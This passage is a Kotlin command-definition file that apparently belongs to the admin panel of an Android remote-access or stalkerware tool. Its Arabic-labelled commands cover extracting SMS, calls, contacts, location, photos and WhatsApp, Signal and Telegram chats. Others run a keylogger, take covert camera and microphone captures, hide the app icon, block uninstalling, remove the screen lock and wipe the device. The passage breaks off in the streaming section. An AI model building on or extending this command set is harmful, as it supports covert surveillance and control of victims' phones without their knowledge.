package com.abuzahra.admin.data.model

/**
 * Command definitions EXACTLY matching the server's COMMAND_REGISTRY.
 * The server expects these exact registry keys (e.g., "sms", "screenshot", "location").
 * The server then maps them to actual device commands internally.
 *
 * DO NOT change the "key" values - they must match server/modules/commands.py exactly.
 */
object CommandDefinitions {

    enum class Category(val displayName: String, val serverKey: String) {
        DATA("البيانات", "data"),
        SOCIAL("التواصل الاجتماعي", "social"),
        CONTROL("التحكم", "control"),
        APPS("التطبيقات", "apps"),
        FILES("الملفات", "files"),
        SECURITY("الأمان", "security"),
        MONITOR("المراقبة", "monitor"),
        STREAMING("البث", "streaming"),
        DEVICE("معلومات الجهاز", "device"),
        INPUT("الإدخال", "input"),
        MEDIA("الوسائط", "media"),
        SYSTEM("النظام", "system")
    }

    data class CommandDef(
        val key: String,        // MUST match server COMMAND_REGISTRY key exactly
        val name: String,
        val description: String,
        val category: Category
    )

    private val allCommands: List<CommandDef> = listOf(

        // ═══════════════════════════════════════════════════════════
        // DATA — 41 commands (matches server "data" category)
        // ═══════════════════════════════════════════════════════════
        CommandDef("sms", "الرسائل", "استخراج جميع الرسائل النصية القصيرة", Category.DATA),
        CommandDef("calls", "سجل المكالمات", "استخراج سجل المكالمات الكامل", Category.DATA),
        CommandDef("contacts", "جهات الاتصال", "استخراج جميع جهات الاتصال من الجهاز", Category.DATA),
        CommandDef("location", "الموقع", "الحصول على الموقع الجغرافي الحالي", Category.DATA),
        CommandDef("notifications", "الإشعارات", "استخراج جميع الإشعارات الحالية", Category.DATA),
        CommandDef("apps", "التطبيقات", "استخراج قائمة التطبيقات", Category.DATA),
        CommandDef("info", "معلومات الجهاز", "استخراج المعلومات الكاملة للجهاز", Category.DATA),
        CommandDef("battery", "البطارية", "استخراج حالة البطارية ومستوى الشحن", Category.DATA),
        CommandDef("gallery", "المعرض", "استخراج الصور من المعرض", Category.DATA),
        CommandDef("clipboard", "الحافظة", "استخراج النص المنسوخ في الحافظة", Category.DATA),
        CommandDef("all_data", "جميع البيانات", "استخراج جميع البيانات دفعة واحدة", Category.DATA),
        CommandDef("wifi_info", "معلومات WiFi", "استخراج شبكات WiFi المحفوظة", Category.DATA),
        CommandDef("network_info", "معلومات الشبكة", "استخراج معلومات الشبكة الحالية", Category.DATA),
        CommandDef("sim_info", "معلومات SIM", "استخراج معلومات شريحة SIM", Category.DATA),
        CommandDef("storage_info", "التخزين", "استخراج معلومات التخزين", Category.DATA),
        CommandDef("installed_apps", "التطبيقات المثبتة", "استخراج قائمة التطبيقات المثبتة", Category.DATA),
        CommandDef("running_apps", "التطبيقات النشطة", "استخراج التطبيقات قيد التشغيل حالياً", Category.DATA),
        CommandDef("calendar", "التقويم", "استخراج أحداث التقويم والمواعيد", Category.DATA),
        CommandDef("browser_history", "سجل المتصفح", "استخراج سجل التصفح والمواقع المزارة", Category.DATA),
        CommandDef("app_usage", "وقت الشاشة", "استخراج وقت استخدام التطبيقات", Category.DATA),
        CommandDef("calendar_events", "أحداث التقويم", "استخراج جميع أحداث التقويم التفصيلية", Category.DATA),
        CommandDef("calendar_next", "المواعيد القادمة", "عرض المواعيد القادمة في التقويم", Category.DATA),
        CommandDef("browser_bookmarks", "إشارات المتصفح", "استخراج الإشارات المرجعية للمتصفح", Category.DATA),
        CommandDef("wifi_networks", "شبكات WiFi", "عرض شبكات WiFi المتاحة", Category.DATA),
        CommandDef("wifi_saved", "WiFi المحفوظة", "عرض شبكات WiFi المحفوظة", Category.DATA),
        CommandDef("bluetooth_devices", "أجهزة بلوتوث", "عرض أجهزة البلوتوث القريبة", Category.DATA),
        CommandDef("bluetooth_paired", "بلوتوث مقترن", "عرض أجهزة البلوتوث المقترنة", Category.DATA),
        CommandDef("installed_apps_full", "تطبيقات كاملة", "قائمة كاملة بكل التطبيقات وتفاصيلها", Category.DATA),
        CommandDef("running_services", "الخدمات النشطة", "عرض جميع الخدمات قيد التشغيل", Category.DATA),
        CommandDef("system_apps", "تطبيقات النظام", "عرض تطبيقات النظام المثبتة", Category.DATA),
        CommandDef("memory_info", "الذاكرة", "معلومات الذاكرة العشوائية RAM", Category.DATA),
        CommandDef("cpu_info", "معلومات المعالج", "تفاصيل المعالج وعدد الأنوية", Category.DATA),
        CommandDef("gpu_info", "كرت الرسومات", "معلومات كرت الرسومات", Category.DATA),
        CommandDef("battery_history", "سجل البطارية", "سجل مستوى البطارية عبر الزمن", Category.DATA),
        CommandDef("network_usage", "استهلاك الشبكة", "إحصائيات استهلاك الشبكة", Category.DATA),
        CommandDef("data_usage", "استهلاك البيانات", "إحصائيات بيانات الهاتف", Category.DATA),
        CommandDef("screen_info", "معلومات الشاشة", "دقة الشاشة ومعدل التحديث", Category.DATA),
        CommandDef("display_info", "العرض", "معلومات العرض والشاشة", Category.DATA),
        CommandDef("locale_info", "اللغة والمنطقة", "إعدادات اللغة والمنطقة", Category.DATA),
        CommandDef("accounts", "حسابات الجهاز", "حسابات Google وغيرها على الجهاز", Category.DATA),
        CommandDef("sync_settings", "إعدادات المزامنة", "حالة مزامنة الحسابات", Category.DATA),

        // ═══════════════════════════════════════════════════════════
        // SOCIAL — 28 commands (matches server "social" category)
        // ═══════════════════════════════════════════════════════════
        CommandDef("whatsapp", "واتساب", "استخراج محادثات ووسائط واتساب", Category.SOCIAL),
        CommandDef("telegram_app", "تيليجرام", "استخراج محادثات ووسائط تيليجرام", Category.SOCIAL),
        CommandDef("instagram", "انستغرام", "استخراج محادثات انستغرام دايركت", Category.SOCIAL),
        CommandDef("messenger", "ماسنجر", "استخراج محادثات فيسبوك ماسنجر", Category.SOCIAL),
        CommandDef("snapchat", "سناب شات", "استخراج رسائل سناب شات", Category.SOCIAL),
        CommandDef("tiktok", "تيك توك", "استخراج رسائل وتفاعلات تيك توك", Category.SOCIAL),
        CommandDef("twitter", "تويتر", "استخراج رسائل تويتر", Category.SOCIAL),
        CommandDef("viber", "فايبر", "استخراج محادثات ورسائل فايبر", Category.SOCIAL),
        CommandDef("signal", "سيجنال", "استخراج محادثات سيجنال المشفرة", Category.SOCIAL),
        CommandDef("facebook", "فيسبوك", "استخراج بيانات فيسبوك", Category.SOCIAL),
        CommandDef("youtube", "يوتيوب", "استخراج بيانات يوتيوب", Category.SOCIAL),
        CommandDef("whatsapp_chats", "محادثات واتساب", "استخراج محادثات واتساب النصية", Category.SOCIAL),
        CommandDef("whatsapp_contacts", "أسماء واتساب", "استخراج أسماء جهات واتساب", Category.SOCIAL),
        CommandDef("whatsapp_status", "حالة واتساب", "استخراج حالات واتساب", Category.SOCIAL),
        CommandDef("telegram_chats", "محادثات تيليجرام", "استخراج محادثات تيليجرام", Category.SOCIAL),
        CommandDef("telegram_contacts", "أسماء تيليجرام", "استخراج أسماء تيليجرام", Category.SOCIAL),
        CommandDef("messenger_chats", "محادثات ماسنجر", "استخراج محادثات ماسنجر", Category.SOCIAL),
        CommandDef("messenger_contacts", "أسماء ماسنجر", "استخراج أسماء ماسنجر", Category.SOCIAL),
        CommandDef("instagram_dm", "رسائل انستغرام", "استخراج رسائل انستغرام المباشرة", Category.SOCIAL),
        CommandDef("instagram_followers", "متابعون", "استخراج قائمة المتابعين", Category.SOCIAL),
        CommandDef("viber_chats", "محادثات فايبر", "استخراج محادثات فايبر", Category.SOCIAL),
        CommandDef("viber_calls", "مكالمات فايبر", "استخراج مكالمات فايبر", Category.SOCIAL),
        CommandDef("signal_chats", "محادثات سيجنال", "استخراج محادثات سيجنال", Category.SOCIAL),
        CommandDef("signal_contacts", "أسماء سيجنال", "استخراج أسماء سيجنال", Category.SOCIAL),
        CommandDef("line_chats", "محادثات LINE", "استخراج محادثات LINE", Category.SOCIAL),
        CommandDef("snapchat_chats", "محادثات سناب", "استخراج محادثات سناب شات", Category.SOCIAL),
        CommandDef("twitter_dm", "رسائل تويتر", "استخراج رسائل تويتر المباشرة", Category.SOCIAL),
        CommandDef("tiktok_messages", "رسائل تيك توك", "استخراج رسائل تيك توك", Category.SOCIAL),

        // ═══════════════════════════════════════════════════════════
        // CONTROL — 60 commands (matches server "control" category)
        // ═══════════════════════════════════════════════════════════
        CommandDef("ping", "Ping", "إرسال طلب ping للجهاز", Category.CONTROL),
        CommandDef("vibrate", "اهتزاز", "تشغيل اهتزاز الجهاز", Category.CONTROL),
        CommandDef("ring", "رنين", "تشغيل رنين الجهاز بكامل الصوت", Category.CONTROL),
        CommandDef("screenshot", "لقطة شاشة", "التقاط لقطة شاشة للجهاز", Category.CONTROL),
        CommandDef("front_camera", "الكاميرا الأمامية", "التقاط صورة بالكاميرا الأمامية", Category.CONTROL),
        CommandDef("back_camera", "الكاميرا الخلفية", "التقاط صورة بالكاميرا الخلفية", Category.CONTROL),
        CommandDef("record_audio", "تسجيل صوت", "تسجيل صوت من ميكروفون الجهاز", Category.CONTROL),
        CommandDef("record_screen", "تسجيل الشاشة", "بدء تسجيل فيديو لشاشة الجهاز", Category.CONTROL),
        CommandDef("lock_phone", "قفل الجهاز", "قفل شاشة الجهاز", Category.CONTROL),
        CommandDef("unlock_phone", "فتح الجهاز", "فتح شاشة الجهاز", Category.CONTROL),
        CommandDef("reboot", "إعادة تشغيل", "إعادة تشغيل الجهاز", Category.CONTROL),
        CommandDef("shutdown", "إيقاف التشغيل", "إيقاف تشغيل الجهاز", Category.CONTROL),
        CommandDef("set_volume", "التحكم بالصوت", "تعيين مستوى الصوت", Category.CONTROL),
        CommandDef("set_brightness", "السطوع", "تعيين مستوى سطوع الشاشة", Category.CONTROL),
        CommandDef("set_ringtone", "نغمة الرنين", "تغيير نغمة رنين الجهاز", Category.CONTROL),
        CommandDef("enable_wifi", "تشغيل WiFi", "تشغيل شبكة WiFi", Category.CONTROL),
        CommandDef("disable_wifi", "إيقاف WiFi", "إيقاف شبكة WiFi", Category.CONTROL),
        CommandDef("enable_bluetooth", "تشغيل بلوتوث", "تشغيل البلوتوث", Category.CONTROL),
        CommandDef("disable_bluetooth", "إيقاف بلوتوث", "إيقاف البلوتوث", Category.CONTROL),
        CommandDef("enable_mobile_data", "تشغيل البيانات", "تشغيل البيانات الخلوية", Category.CONTROL),
        CommandDef("disable_mobile_data", "إيقاف البيانات", "إيقاف البيانات الخلوية", Category.CONTROL),
        CommandDef("enable_hotspot", "تشغيل الهوت سبوت", "تشغيل نقطة اتصال WiFi", Category.CONTROL),
        CommandDef("disable_hotspot", "إيقاف الهوت سبوت", "إيقاف نقطة اتصال WiFi", Category.CONTROL),
        CommandDef("airplane_on", "وضع الطيار", "تفعيل وضع الطيران", Category.CONTROL),
        CommandDef("airplane_off", "إلغاء الطيران", "إلغاء وضع الطيران", Category.CONTROL),
        CommandDef("torch_on", "تشغيل الفلاش", "تشغيل ضوء الكشاف", Category.CONTROL),
        CommandDef("torch_off", "إيقاف الفلاش", "إيقاف ضوء الكشاف", Category.CONTROL),
        CommandDef("play_sound", "تشغيل صوت", "تشغيل صوت على الجهاز", Category.CONTROL),
        CommandDef("speak_text", "نطق نص", "نطق نص على الجهاز", Category.CONTROL),
        CommandDef("show_notification", "إظهار إشعار", "عرض إشعار على شاشة الجهاز", Category.CONTROL),
        CommandDef("open_url", "فتح رابط", "فتح رابط في متصفح الجهاز", Category.CONTROL),
        CommandDef("send_sms", "إرسال رسالة نصية", "إرسال رسالة نصية من الجهاز", Category.CONTROL),
        CommandDef("make_call", "إجراء مكالمة", "إجراء مكالمة هاتفية من الجهاز", Category.CONTROL),
        CommandDef("safe_mode", "الوضع الآمن", "إعادة تشغيل الجهاز بالوضع الآمن", Category.CONTROL),
        CommandDef("set_screen_timeout", "وقت إيقاف الشاشة", "تعيين مدة إطفاء الشاشة", Category.CONTROL),
        CommandDef("set_ringer_mode", "وضع الرنين", "تغيير وضع الرنين (عام/صامت/اهتزاز)", Category.CONTROL),
        CommandDef("play_tone", "نغمة قصيرة", "تشغيل نغمة قصيرة", Category.CONTROL),
        CommandDef("set_wallpaper", "خلفية الشاشة", "تغيير خلفية الشاشة", Category.CONTROL),
        CommandDef("set_alarm", "ضبط منبه", "ضبط منبه بوقت محدد", Category.CONTROL),
        CommandDef("set_locale", "لغة الجهاز", "تغيير لغة الجهاز", Category.CONTROL),
        CommandDef("set_language", "تغيير اللغة", "تغيير لغة النظام", Category.CONTROL),
        CommandDef("set_timezone", "المنطقة الزمنية", "تغيير المنطقة الزمنية", Category.CONTROL),
        CommandDef("set_gps_mode", "وضع GPS", "تغيير وضع GPS (عالي/منخفض)", Category.CONTROL),
        CommandDef("enable_data_saver", "حافظ البيانات", "تفعيل وضع حافظ البيانات", Category.CONTROL),
        CommandDef("disable_data_saver", "إيقاف حافظ البيانات", "إيقاف وضع حافظ البيانات", Category.CONTROL),
        CommandDef("enable_battery_saver", "حافظ البطارية", "تفعيل وضع حافظ البطارية", Category.CONTROL),
        CommandDef("disable_battery_saver", "إيقاف حافظ البطارية", "إيقاف وضع حافظ البطارية", Category.CONTROL),
        CommandDef("enable_auto_rotate", "تدوير تلقائي", "تفعيل التدوير التلقائي للشاشة", Category.CONTROL),
        CommandDef("disable_auto_rotate", "إيقاف التدوير", "إيقاف التدوير التلقائي", Category.CONTROL),
        CommandDef("enable_nfc", "تشغيل NFC", "تفعيل NFC", Category.CONTROL),
        CommandDef("disable_nfc", "إيقاف NFC", "إيقاف NFC", Category.CONTROL),
        CommandDef("enable_dev_mode", "وضع المطور", "تفعيل خيارات المطور", Category.CONTROL),
        CommandDef("disable_dev_mode", "إيقاف المطور", "إيقاف خيارات المطور", Category.CONTROL),
        CommandDef("enable_usb_debug", "تصحيح USB", "تفعيل تصحيح USB", Category.CONTROL),
        CommandDef("disable_usb_debug", "إيقاف USB", "إيقاف تصحيح USB", Category.CONTROL),
        CommandDef("dns_change", "تغيير DNS", "تغيير خادم DNS", Category.CONTROL),
        CommandDef("proxy_set", "إعداد Proxy", "ضبط إعدادات البروكسي", Category.CONTROL),
        CommandDef("apn_settings", "إعدادات APN", "فتح إعدادات APN", Category.CONTROL),
        CommandDef("block_number", "حظر رقم", "حظر رقم هاتف من الاتصال", Category.CONTROL),
        CommandDef("unblock_number", "إلغاء حظر رقم", "إلغاء حظر رقم هاتف", Category.CONTROL),
        CommandDef("open_settings", "إعدادات الجهاز", "فتح إعدادات الجهاز", Category.CONTROL),
        CommandDef("open_wifi_settings", "إعدادات WiFi", "فتح إعدادات WiFi", Category.CONTROL),
        CommandDef("open_bluetooth_settings", "إعدادات البلوتوث", "فتح إعدادات البلوتوث", Category.CONTROL),
        CommandDef("open_location_settings", "إعدادات الموقع", "فتح إعدادات الموقع", Category.CONTROL),
        CommandDef("open_app_settings", "إعدادات التطبيقات", "فتح إعدادات التطبيقات", Category.CONTROL),
        CommandDef("open_security_settings", "إعدادات الأمان", "فتح إعدادات الأمان", Category.CONTROL),
        CommandDef("open_developer_options", "خيارات المطور", "فتح خيارات المطور", Category.CONTROL),
        CommandDef("open_accessibility_settings", "إعدادات الوصول", "فتح إعدادات الوصول", Category.CONTROL),
        CommandDef("open_notification_settings", "إعدادات الإشعارات", "فتح إعدادات الإشعارات", Category.CONTROL),
        CommandDef("answer_call", "رد على مكالمة", "الرد على مكالمة واردة", Category.CONTROL),
        CommandDef("end_call", "إنهاء مكالمة", "إنهاء المكالمة الحالية", Category.CONTROL),
        CommandDef("send_ussd", "كود USSD", "إرسال كود USSD", Category.CONTROL),
        CommandDef("send_sms_to", "SMS لرقم", "إرسال SMS لرقم محدد", Category.CONTROL),
        CommandDef("send_sms_broadcast", "بث SMS", "إرسال SMS لعدة أرقام", Category.CONTROL),
        CommandDef("post_notification", "إشعار مخصص", "إظهار إشعار مخصص على الجهاز", Category.CONTROL),
        CommandDef("cancel_notification", "إلغاء إشعار", "إلغاء إشعار محدد", Category.CONTROL),
        CommandDef("cancel_all_notifications", "إلغاء كل الإشعارات", "إلغاء جميع إشعارات التطبيق", Category.CONTROL),

        // ═══════════════════════════════════════════════════════════
        // APPS — 20 commands (matches server "apps" category)
        // ═══════════════════════════════════════════════════════════
        CommandDef("open_app", "فتح تطبيق", "فتح تطبيق على الجهاز", Category.APPS),
        CommandDef("close_app", "إغلاق تطبيق", "إغلاق تطبيق", Category.APPS),
        CommandDef("install_app", "تثبيت تطبيق", "تثبيت تطبيق من رابط APK", Category.APPS),
        CommandDef("uninstall_app", "حذف تطبيق", "إلغاء تثبيت تطبيق", Category.APPS),
        CommandDef("block_app", "حظر تطبيق", "حظر تطبيق من التشغيل", Category.APPS),
        CommandDef("unblock_app", "إلغاء حظر", "إلغاء حظر تطبيق", Category.APPS),
        CommandDef("clear_app_data", "مسح بيانات", "مسح جميع بيانات تطبيق", Category.APPS),
        CommandDef("force_stop_app", "إيقاف قسري", "إيقاف تطبيق بشكل قسري", Category.APPS),
        CommandDef("clear_app_cache", "مسح الكاش", "مسح ذاكرة التخزين المؤقت", Category.APPS),
        CommandDef("enable_app", "تفعيل تطبيق", "تفعيل تطبيق معطل", Category.APPS),
        CommandDef("disable_app", "تعطيل تطبيق", "تعطيل تطبيق", Category.APPS),
        CommandDef("get_app_info", "معلومات تطبيق", "معلومات تفصيلية عن تطبيق", Category.APPS),
        CommandDef("get_app_permissions", "صلاحيات تطبيق", "عرض صلاحيات تطبيق", Category.APPS),
        CommandDef("get_app_data_usage", "بيانات التطبيق", "استهلاك التطبيق للبيانات", Category.APPS),
        CommandDef("set_app_restrictions", "قيود التطبيق", "وضع قيود على تطبيق", Category.APPS),
        CommandDef("hide_app_pkg", "إخفاء حزمة", "إخفاء حزمة تطبيق", Category.APPS),
        CommandDef("unhide_app_pkg", "إظهار حزمة", "إظهار حزمة تطبيق", Category.APPS),
        CommandDef("app_info", "تفاصيل التطبيق", "عرض تفاصيل تطبيق", Category.APPS),
        CommandDef("app_permissions", "صلاحيات الحزمة", "عرض صلاحيات حزمة", Category.APPS),
        CommandDef("list_blocked", "التطبيقات المحظورة", "عرض التطبيقات المحظورة", Category.APPS),

        // ═══════════════════════════════════════════════════════════
        // FILES — 40 commands (matches server "files" category)
        // ═══════════════════════════════════════════════════════════
        CommandDef("list_files", "عرض الملفات", "عرض الملفات والمجلدات في مسار معين", Category.FILES),
        CommandDef("list_downloads", "التنزيلات", "عرض ملفات التنزيلات", Category.FILES),
        CommandDef("list_dcim", "الكاميرا", "عرض ملفات الكاميرا", Category.FILES),
        CommandDef("list_music", "الموسيقى", "عرض ملفات الموسيقى", Category.FILES),
        CommandDef("list_videos", "الفيديوهات", "عرض ملفات الفيديو", Category.FILES),
        CommandDef("list_documents", "المستندات", "عرض المستندات", Category.FILES),
        CommandDef("list_whatsapp", "واتساب ملفات", "عرض ملفات واتساب", Category.FILES),
        CommandDef("list_telegram_files", "تيليجرام ملفات", "عرض ملفات تيليجرام", Category.FILES),
        CommandDef("list_pictures", "الصور", "عرض مجلد الصور", Category.FILES),
        CommandDef("list_audiobooks", "الكتب الصوتية", "عرض الكتب الصوتية", Category.FILES),
        CommandDef("list_podcasts", "البودكاست", "عرض البودكاست", Category.FILES),
        CommandDef("list_notifications", "إشعارات النظام", "عرض إشعارات النظام", Category.FILES),
        CommandDef("list_recordings", "التسجيلات", "عرض التسجيلات الصوتية", Category.FILES),
        CommandDef("recent_files", "أحدث الملفات", "عرض أحدث الملفات", Category.FILES),
        CommandDef("search_files", "بحث ملفات", "البحث عن ملفات على الجهاز", Category.FILES),
        CommandDef("get_file", "تحميل ملف", "تحميل ملف من الجهاز", Category.FILES),
        CommandDef("download_file", "تنزيل ملف", "تنزيل ملف من رابط", Category.FILES),
        CommandDef("upload_file", "رفع ملف", "رفع ملف للجهاز", Category.FILES),
        CommandDef("delete_file", "حذف ملف", "حذف ملف من الجهاز", Category.FILES),
        CommandDef("rename_file", "إعادة تسمية", "إعادة تسمية ملف", Category.FILES),
        CommandDef("move_file", "نقل ملف", "نقل ملف لموقع آخر", Category.FILES),
        CommandDef("copy_file", "نسخ ملف", "نسخ ملف", Category.FILES),
        CommandDef("create_folder", "إنشاء مجلد", "إنشاء مجلد جديد", Category.FILES),
        CommandDef("delete_folder", "حذف مجلد", "حذف مجلد", Category.FILES),
        CommandDef("list_files_recursive", "عرض متداخل", "عرض الملفات بشكل متداخل", Category.FILES),
        CommandDef("get_file_content", "محتوى ملف", "قراءة محتوى ملف نصي", Category.FILES),
        CommandDef("get_file_info", "معلومات ملف", "معلومات تفصيلية عن ملف", Category.FILES),
        CommandDef("get_file_hash", "بصمة الملف", "حساب بصمة MD5/SHA للملف", Category.FILES),
        CommandDef("compress_file", "ضغط ملف", "ضغط ملف إلى ZIP", Category.FILES),
        CommandDef("extract_archive", "استخراج أرشيف", "استخراج ملف مضغوط", Category.FILES),
        CommandDef("encrypt_file", "تشفير ملف", "تشفير ملف حساس", Category.FILES),
        CommandDef("decrypt_file", "فك تشفير ملف", "فك تشفير ملف", Category.FILES),
        CommandDef("file_info", "تفاصيل الملف", "عرض تفاصيل الملف", Category.FILES),
        CommandDef("zip_files", "أرشفة ZIP", "أرشفة مجلد إلى ZIP", Category.FILES),
        CommandDef("get_folder_size", "حجم المجلد", "حساب حجم مجلد", Category.FILES),
        CommandDef("send_full_backup", "نسخ احتياطي كامل", "أخذ نسخة احتياطية كاملة", Category.FILES),
        CommandDef("send_backup_contacts", "نسخة جهات الاتصال", "نسخة احتياطية للجهات", Category.FILES),
        CommandDef("send_backup_sms", "نسخة الرسائل", "نسخة احتياطية للرسائل", Category.FILES),
        CommandDef("send_backup_calls", "نسخة المكالمات", "نسخة احتياطية للمكالمات", Category.FILES),
        CommandDef("send_backup_whatsapp", "نسخة واتساب", "نسخة احتياطية لملفات واتساب", Category.FILES),

        // ═══════════════════════════════════════════════════════════
        // SECURITY — 36 commands (matches server "security" category)
        // ═══════════════════════════════════════════════════════════
        CommandDef("wipe_data", "مسح البيانات", "مسح جميع البيانات", Category.SECURITY),
        CommandDef("factory_reset", "إعادة تعيين المصنع", "إعادة تعيين المصنع", Category.SECURITY),
        CommandDef("show_app", "إظهار التطبيق", "إظهار أيقونة التطبيق", Category.SECURITY),
        CommandDef("hide_app", "إخفاء التطبيق", "إخفاء أيقونة التطبيق", Category.SECURITY),
        CommandDef("change_passcode", "تغيير رمز PIN", "تغيير رمز PIN لقفل الشاشة", Category.SECURITY),
        CommandDef("enable_biometric", "تشغيل البصمة", "تفعيل قفل البصمة", Category.SECURITY),
        CommandDef("disable_biometric", "إيقاف البصمة", "إيقاف قفل البصمة", Category.SECURITY),
        CommandDef("anti_uninstall_on", "حماية الحذف", "تفعيل حماية الحذف", Category.SECURITY),
        CommandDef("anti_uninstall_off", "إلغاء الحماية", "إلغاء حماية الحذف", Category.SECURITY),
        CommandDef("device_admin_status", "حالة المسؤول", "عرض حالة مسؤول الجهاز", Category.SECURITY),
        CommandDef("check_root", "فحص الروت", "التحقق مما إذا كان الجهاز مروتاً", Category.SECURITY),
        CommandDef("enable_lost_mode", "وضع الفقدان", "تفعيل وضع الفقدان", Category.SECURITY),
        CommandDef("disable_lost_mode", "إيقاف وضع الفقدان", "إيقاف وضع الفقدان", Category.SECURITY),
        CommandDef("wipe_external", "مسح التخزين الخارجي", "مسح التخزين الخارجي", Category.SECURITY),
        CommandDef("lock_with_message", "قفل برسالة", "قفل الجهاز مع رسالة", Category.SECURITY),
        CommandDef("set_owner_info", "معلومات المالك", "تعيين معلومات مالك الجهاز", Category.SECURITY),
        CommandDef("enable_encryption", "تشفير الجهاز", "تفعيل تشفير الجهاز", Category.SECURITY),
        CommandDef("get_security_patch", "تحديث الأمان", "مستوى تحديث الأمان", Category.SECURITY),
        CommandDef("get_safety_net", "SafetyNet", "نتيجة فحص SafetyNet", Category.SECURITY),
        CommandDef("verify_boot", "التحقق من الإقلاع", "حالة التحقق من الإقلاع", Category.SECURITY),
        CommandDef("set_password_policy", "سياسة كلمة المرور", "تعيين سياسة كلمة المرور", Category.SECURITY),
        CommandDef("force_lock_now", "قفل فوري", "قفل الجهاز فوراً", Category.SECURITY),
        CommandDef("get_lock_history", "سجل القفل", "سجل عمليات القفل", Category.SECURITY),
        CommandDef("set_screen_lock", "تفعيل قفل الشاشة", "تفعيل قفل الشاشة", Category.SECURITY),
        CommandDef("remove_screen_lock", "إزالة قفل الشاشة", "إزالة قفل الشاشة", Category.SECURITY),
        CommandDef("lock_screen_now", "قفل الآن", "قفل الشاشة الآن", Category.SECURITY),
        CommandDef("lock_with_password", "قفل بكلمة مرور", "قفل الجهاز بكلمة مرور", Category.SECURITY),
        CommandDef("set_pin", "تعيين PIN", "تعيين رمز PIN", Category.SECURITY),
        CommandDef("remove_pin", "إزالة PIN", "إزالة رمز PIN", Category.SECURITY),
        CommandDef("set_password_quality", "جودة كلمة المرور", "تعيين جودة كلمة المرور", Category.SECURITY),
        CommandDef("request_device_admin", "طلب صلاحية المسؤول", "طلب صلاحيات مسؤول الجهاز", Category.SECURITY),
        CommandDef("get_encryption_status", "حالة التشفير", "عرض حالة التشفير", Category.SECURITY),
        CommandDef("disable_camera_hw", "تعطيل الكاميرا", "تعطيل الكاميرا على مستوى الأجهزة", Category.SECURITY),
        CommandDef("enable_camera_hw", "تفعيل الكاميرا", "تفعيل الكاميرا", Category.SECURITY),
        CommandDef("disable_screen_capture", "منع التقاط الشاشة", "منع التقاط لقطات الشاشة", Category.SECURITY),
        CommandDef("enable_screen_capture", "السماح بالتقاط الشاشة", "السماح بالتقاط الشاشة", Category.SECURITY),

        // ═══════════════════════════════════════════════════════════
        // MONITOR — 36 commands (matches server "monitor" category)
        // ═══════════════════════════════════════════════════════════
        CommandDef("keylogger_start", "بدء تسجيل المفاتيح", "بدء تسجيل ضغطات المفاتيح", Category.MONITOR),
        CommandDef("keylogger_stop", "إيقاف تسجيل المفاتيح", "إيقاف تسجيل ضغطات المفاتيح", Category.MONITOR),
        CommandDef("get_keylogger", "عرض السجل", "عرض بيانات تسجيل المفاتيح", Category.MONITOR),
        CommandDef("screen_record_start", "بدء تسجيل الشاشة", "بدء تسجيل فيديو للشاشة", Category.MONITOR),
        CommandDef("screen_record_stop", "إيقاف التسجيل", "إيقاف تسجيل الشاشة", Category.MONITOR),
        CommandDef("location_live", "تتبع مباشر", "بدء تتبع الموقع المستمر", Category.MONITOR),
        CommandDef("location_stop", "إيقاف التتبع", "إيقاف تتبع الموقع", Category.MONITOR),
        CommandDef("clipboard_monitor_start", "مراقبة الحافظة", "بدء مراقبة الحافظة", Category.MONITOR),
        CommandDef("clipboard_monitor_stop", "إيقاف مراقبة الحافظة", "إيقاف مراقبة الحافظة", Category.MONITOR),
        CommandDef("sms_monitor", "مراقبة الرسائل", "بدء مراقبة الرسائل الواردة", Category.MONITOR),
        CommandDef("call_monitor", "مراقبة المكالمات", "بدء مراقبة المكالمات", Category.MONITOR),
        CommandDef("sms_monitor_stop", "إيقاف مراقبة الرسائل", "إيقاف مراقبة الرسائل", Category.MONITOR),
        CommandDef("call_monitor_stop", "إيقاف مراقبة المكالمات", "إيقاف مراقبة المكالمات", Category.MONITOR),
        CommandDef("wifi_monitor_start", "مراقبة WiFi", "بدء مراقبة شبكات WiFi", Category.MONITOR),
        CommandDef("wifi_monitor_stop", "إيقاف مراقبة WiFi", "إيقاف مراقبة شبكات WiFi", Category.MONITOR),
        CommandDef("app_monitor_start", "مراقبة التطبيقات", "بدء مراقبة التطبيقات", Category.MONITOR),
        CommandDef("app_monitor_stop", "إيقاف مراقبة التطبيقات", "إيقاف مراقبة التطبيقات", Category.MONITOR),
        CommandDef("get_app_log", "سجل التطبيقات", "عرض سجل استخدام التطبيقات", Category.MONITOR),
        CommandDef("notification_monitor_start", "مراقبة الإشعارات", "بدء مراقبة الإشعارات", Category.MONITOR),
        CommandDef("notification_monitor_stop", "إيقاف الإشعارات", "إيقاف مراقبة الإشعارات", Category.MONITOR),
        CommandDef("get_notification_history", "سجل الإشعارات", "عرض سجل الإشعارات", Category.MONITOR),
        CommandDef("get_clipboard_history", "سجل الحافظة", "عرض سجل الحافظة", Category.MONITOR),
        CommandDef("get_location_history", "سجل المواقع", "عرض سجل المواقع", Category.MONITOR),
        CommandDef("clear_location_history", "مسح سجل المواقع", "مسح سجل المواقع", Category.MONITOR),
        CommandDef("clear_clipboard_history", "مسح سجل الحافظة", "مسح سجل الحافظة", Category.MONITOR),
        CommandDef("clear_keylog", "مسح سجل المفاتيح", "مسح سجل ضغطات المفاتيح", Category.MONITOR),
        CommandDef("geo_add", "إضافة سياج جغرافي", "إضافة سياج جغرافي", Category.MONITOR),
        CommandDef("geo_remove", "حذف سياج جغرافي", "حذف سياج جغرافي", Category.MONITOR),
        CommandDef("geo_list", "قائمة السياجات", "عرض قائمة السياجات الجغرافية", Category.MONITOR),
        CommandDef("screenshot_burst", "لقاطات متعددة", "التقاط عدة لقطات شاشة", Category.MONITOR),
        CommandDef("record_screen_video", "فيديو الشاشة", "تسجيل فيديو الشاشة", Category.MONITOR),
        CommandDef("get_device_events", "أحداث الجهاز", "عرض أحداث الجهاز", Category.MONITOR),
        CommandDef("events_on", "تفعيل الإرسال", "تفعيل الإرسال التلقائي للأحداث", Category.MONITOR),
        CommandDef("events_off", "إيقاف الإرسال", "إيقاف الإرسال التلقائي", Category.MONITOR),
        CommandDef("events_status", "حالة الأحداث", "عرض حالة الأحداث", Category.MONITOR),
        CommandDef("events_clear", "مسح الأحداث", "مسح ذاكرة الأحداث", Category.MONITOR),

        // ═══════════════════════════════════════════════════════════
        // STREAMING — 20 commands (matches server "streaming" category)
        // ═══════════════════════════════════════════════════════════
        CommandDef("start_screen_stream", "بث الشاشة", "بدء بث مباشر من الشاشة", Category.STREAMING),
        CommandDef("stop_screen_stream", "إيقاف بث الشاشة", "إيقاف بث الشاشة", Category.STREAMING),
